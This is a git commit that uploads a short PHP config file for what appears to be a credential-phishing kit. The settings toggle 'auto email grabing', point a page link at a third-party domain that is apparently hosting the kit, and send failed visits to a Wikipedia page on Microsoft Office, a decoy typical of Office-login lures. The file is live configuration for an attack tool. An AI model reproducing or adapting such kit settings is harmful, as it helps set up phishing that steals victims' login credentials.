6c0bdae5f04931ca4b78259903564c5dafe65353
vedaaddariopbp25 <114259316+vedaaddariopbp25@users.noreply.github.com>
2022-09-23 14:57:12 -0500

    Add files via upload

---
+++ config.php
@@ -0,0 +1,7 @@
+<?php
+
+$autoEmail="true";//"true":Auto email grabing "false":without auto email grabing
+$pagelink="https://visionhomes.co.ke/DE/rek/";
+$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
+$redirecttype="2";// 1:header - 2:script
+?>
